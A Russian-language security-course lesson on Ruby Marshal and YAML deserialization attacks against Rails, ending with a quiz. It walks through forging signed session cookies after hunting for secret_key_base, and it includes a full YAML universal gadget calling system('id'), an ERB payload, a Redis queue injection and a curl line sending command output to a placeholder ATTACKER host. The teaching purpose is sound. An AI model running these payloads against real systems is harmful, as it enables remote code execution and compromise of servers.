---
id: web-ruby-deser
title: "Ruby Marshal/YAML deserialization: Rails-class RCE"
category: web
parent: web-deser-languages
difficulty: hard
order: 3
tags: [ruby, marshal, yaml, deserialization, rails, rce]
prerequisites: [web-deserialization]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 36
summary: "Ruby-десериализация: Marshal.load и YAML.load gadget'ы, Rails-цепочки, universal deserialisation gadget."
---

## Вопрос, с которого всё начинается

Мы прошли Python и Node. В Ruby механизм десериализации устроен хитрее: «магия» живёт не в формате, а в **наборе классов, уже загруженных приложением**. У типичного Rails-приложения в памяти тысячи классов фреймворка, и среди них есть такие, чьи методы при определённой последовательности вызовов приводят к запуску команды.

Вопрос: можно ли собрать из этих классов «дорожку» до выполнения кода и подсунуть её серверу как обычную сессионную cookie? Да — и это классический путь к RCE в Rails. Разберём на одном примере.

## Наш пример

Есть Rails-приложение `portal.example`. При входе оно ставит cookie сессии:

```bash
$ curl -si https://portal.example/login -d 'user=bob&pass=...' | grep -i set-cookie
Set-Cookie: _session_id=BAh7CEkiD3Nlc3Npb25faWQGOgZFVE...
```

Значение `_session_id` — base64. Декодируем:

```bash
$ echo 'BAh7CEkiD3Nlc3Npb25faWQGOgZFVE...' | base64 -d | xxd | head -1
00000000: 0408 7b08 4909 2273 6573 7369 6f6e 5f69  ..{.I."session_i
```

Первые два байта `04 08` — сигнатура **Marshal**, встроенного формата сериализации Ruby (`base64` от них начинается с `BAh`). Значит, Rails хранит сессию как `Marshal`-объект. Ключевой вопрос: **проверяет ли сервер, что объект не подделали?** В Rails — да, cookie **подписана** ключом `secret_key_base`. Поэтому путь к RCE — сначала найти этот ключ.

## Шаг 1: что такое gadget-цепочка

В Python мы просто заставляли `pickle` вызвать `os.system`. В Ruby так нельзя: `Marshal.load` восстанавливает объекты и вызывает их методы `_load`, `init_with`, `hash`, `to_s` — и среди классов Rails/RubyGems находятся такие, чей метод, вызванный в нужный момент, запускает команду.

«Дорожка» из таких классов и есть **gadget-цепочка** («universal deserialization gadget» для Rails 5/6). Она зависит от точной версии фреймворка: классы и их методы меняются между версиями, поэтому один и тот же payload работает или не работает в зависимости от Rails/Ruby. Готовые скрипты (`rails_universal_gadget`, `Ruby-Marshal-RCE`) собирают эту цепочку за тебя:

```bash
$ ruby gadget.rb "id" > payload.bin
$ base64 -w0 payload.bin
```

## Шаг 2: ищем `secret_key_base`

Без ключа подпись cookie не сойдётся, и Rails отбросит запрос. Ключ утекает по-разному — ищем:

```bash
$ grep -rn "secret_key_base" . --include='*.yml' --include='*.rb' --include='.env*'
$ git log -p | grep -i secret_key_base
$ cat config/master.key        # ключ расшифровки credentials
```

Кроме репозитория, ключ бывает в `.env`, в git-истории (если коммитили и «удалили»), в Docker-слоях, а иногда оставлен дефолтным. Нашли ключ — почти всё готово.

## Шаг 3: подделываем cookie и подтверждаем RCE

Скрипт умеет подписать наш gadget тем же ключом:

```bash
$ ruby gadget.rb "curl http://ATTACKER:8080/$(id|base64)" --secret "$SECRET_KEY_BASE" > cookie
$ python3 -m http.server 8080 &
$ curl -s https://portal.example/ -H "Cookie: _session_id=$(base64 -w0 cookie)"
# в логе: GET /dWlkPTAocm9vdCkK
```

Пришёл запрос с base64 от `id=0(root)` — код выполнен. Доказательство через **OOB** надёжнее, чем ждать вывод в ответе: деструкторы Ruby не возвращают текст.

Если cookie **зашифрован** (не просто подписан — `MessageEncryptor`), нужен тот же `secret_key_base` для ключа шифрования; скрипт умеет и это. А если ключ так и не нашёлся — вектор временно **заблокирован**: без него подпись не сойдётся. Тогда ищем другую точку, где Marshal десериализуется **без проверки подписи** (см. шаг 4).

## Шаг 4: где ещё десериализуется Ruby

- **Redis/Sidekiq/Resque:** если настроен `Marshal`-сериализатор, задачи лежат в Redis как Marshal-блобы. Redis без пароля → пишем свой:

```bash
$ redis-cli -h TARGET RPUSH queue:default '<marshal payload>'
```

Воркер десериализует → RCE. Тот же паттерн «доступ к Redis → очередь → RCE».

- **DRb (Distributed Ruby):** использует Marshal по сети и часто не аутентифицирован вовсе:

```bash
$ ruby -e 'require "drb"; p DRbObject.new_with_uri("druby://TARGET:8787")'
```

- **YAML-точки:** если параметр уходит в `YAML.load`, работает текстовая инъекция (шаг 5).
- **`ActiveRecord serialize :field`:** сериализованные колонки используют YAML/Marshal.

Ищи опасные загрузчики статически:

```bash
$ grep -rn "Marshal.load\|YAML.load\|Psych.load" . --include='*.rb'
```

## Шаг 5: YAML-инъекция

Ruby-специфичные YAML-теги создают объекты прямо из текста. Простейший вариант — через `ERB`:

```yaml
--- !ruby/object:ERB
src: "<%= system('id') %>"
```

Тег `!ruby/object:ClassName` создаёт объект класса; если цепочка приведёт его к строке или вызовет `result`, произойдёт выполнение. Практичнее — universal gadget через `Gem::Requirement`, где якоря `&1` строят циклический граф:

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

Доставка — в теле запроса с `Content-Type: application/x-yaml`:

```bash
$ curl -s https://portal.example/api/import \
  -H 'Content-Type: application/x-yaml' --data-binary @evil.yml
```

Признак успеха — обратный DNS/HTTP-запрос к твоему listener'у или файл-маркер.

## Шаг 6: Marshal против YAML — что выбрать

| Критерий | Marshal | YAML |
|----------|---------|------|
| Формат | бинарь (`04 08`) | текст |
| Признак | base64 `BAh` | `--- !ruby/object:` |
| Где встречается | cookies, Redis, Sidekiq | конфиги, API, `serialize`-колонки |
| Unsafe по умолчанию | всегда | до Ruby 3.1 (Psych 4) |
| Доставка | base64/hex | как есть / в теле |

Важная деталь: начиная с Ruby 3.1 (Psych 4) `YAML.load` стал **безопасным** по умолчанию. Поэтому YAML-инъекция работает только на старых версиях или там, где явно вызван `unsafe_load`. Начинай с того формата, который реально видишь в перехвате.

## Что мы теперь знаем

- `Marshal.load` и `YAML.load` (без safe) восстанавливают произвольные объекты Ruby.
- RCE строится из **gadget-цепочки** классов, уже загруженных приложением; она зависит от версии Rails/Ruby.
- Rails-сессия — это Marshal + подпись `secret_key_base`; без ключа cookie не пройдёт.
- Инструменты: `rails_universal_gadget`, `Ruby-Marshal-RCE`; для поиска ключа — grep/git.
- Признаки: base64 `BAh`/`BAhv` (Marshal), `--- !ruby/object:` (YAML).
- Артефакт — OOB-запрос или файл-маркер, а не «ошибка 500».

## На что смотреть дальше

- **Не забудь про подпись.** Без `secret_key_base` поддельная cookie отбрасывается — это `blocked`, а не «не уязвимо».
- **Gadget под версию.** Набор классов меняется; подбирай цепочку под точную версию Rails/Ruby.
- **YAML стал безопасным в Ruby 3.1.** Проверяй версию перед выводом.
- **Ищи точки без подписи:** Redis/Sidekiq, DRb, кеш — там Marshal десериализуется «как есть».
- **Не путай форматы.** Marshal и YAML — разная доставка; не подменяй один другим.
- **Только с согласия.** RCE меняет состояние прода.

## Квиз

Проверь себя.

```quiz
- question: "Декодированная cookie начинается с байтов `04 08`. Что это?"
  options:
    - "Python pickle"
    - "Ruby Marshal"
    - "PHP serialize"
    - "ZIP-архив"
  answer: 1
  explanation: "`04 08` — сигнатура Marshal; в base64 это `BAh`."
- question: "Что обязательно нужно для подделки Rails session cookie?"
  options:
    - "Только cookie"
    - "`secret_key_base` и gadget под версию Rails"
    - "TLS-сертификат"
    - "SQL-инъекция"
  answer: 1
  explanation: "Rails проверяет подпись ключом, поэтому нужен ключ и подходящая цепочка."
- question: "Какой YAML-тег создаёт Ruby-объект?"
  options:
    - "`!!str`"
    - "`!ruby/object:ClassName`"
    - "`!!int`"
    - "`!!map`"
  answer: 1
  explanation: "Ruby-специфичный тег создаёт объект указанного класса."
- question: "Почему universal gadget зависит от версии?"
  options:
    - "Он длинный"
    - "Набор доступных классов и их методы меняются между версиями Rails/Ruby"
    - "Он шифруется"
    - "Он кешируется"
  answer: 1
  explanation: "Цепочка строится из классов, которые есть в конкретной версии."
- question: "Ключ `secret_key_base` не найден. Как это трактовать?"
  options:
    - "Цель безопасна"
    - "Вектор через cookie заблокирован; ищи точку десериализации без подписи (Redis/DRb)"
    - "Надо сменить браузер"
    - "Это XSS"
  answer: 1
  explanation: "Без ключа подпись не сойдётся, но есть другие точки без проверки подписи."
```

## Куда дальше

Дальше мы разберём самую популярную «фабрику» готовых цепочек для PHP — **`phpggc`** и устройство POP-цепочек (`web-php-deser-chains`). А пока главное запомни: в Ruby RCE строится из **классов, уже загруженных приложением**, а входной точкой часто служит подписанная cookie.

## Где пригодится

- **CTF (Web):** задачи на Ruby-deser.
- **Bug bounty:** Rails cookie RCE — критичный отчёт.
- **Пентест:** аудит Rails-приложений.
- **Работа (AppSec):** `safe_load`, JSON-сериализация, защита `secret_key_base`, обновление Rails.
